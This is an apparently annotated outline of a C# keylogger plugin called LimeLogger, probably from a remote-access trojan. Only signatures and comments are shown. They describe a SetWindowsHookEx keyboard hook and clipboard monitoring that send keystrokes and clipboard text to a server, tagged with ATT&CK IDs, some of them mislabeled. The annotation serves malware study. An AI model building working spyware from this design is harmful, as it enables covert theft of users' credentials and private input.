...
namespace Plugin
{
    ...
    public class ClipboardNotification : Form
    {
        ...
        *     About: 
        *          Sets up a notification for when the clipboard is updated and sends the content back to the server
        *      Returns:
        *          packet it sent to server with current text in the clipboard
    ...
    internal static class Clipboard
    {
        ...
        * Clipboard.GetCurrentText()
        *     About: 
        *          Gets current text from the clipboard
        *      Returns:
    ...
    public static class HandleLimeLogger
    {
        ...
        *     About: 
        *          Main function for LimeLogger keylogging plugin. Calls sethook function and waits for input - notifies via clipboardnotification
        *      Returns:
        *          keystrokes as text via clipboardnotification
        *      MITRE ATT&CK Techniques:
        *          T1056.001
        *  
        */
        ...
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
                /*
        * HandleLimeLogger.SetHook()
        *     About: 
        *          Uses SetWindowsHookEx to set up keyboard hook
        *      Returns:
        *          Hook to read keyboard input
        *      MITRE ATT&CK Techniques:
        *          T1115 Clipboard Data
        *  
        */
        ...
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
                /*
        * HandleLimeLogger.HookCallback()
        *     About: 
        *          Reads keystrokes and sends them back to the server
        *      Returns:
        *          packet it sent to server with data from keystrokes
        *      MITRE ATT&CK Techniques:
        *          T1115 Clipboard Data
        *  
        */
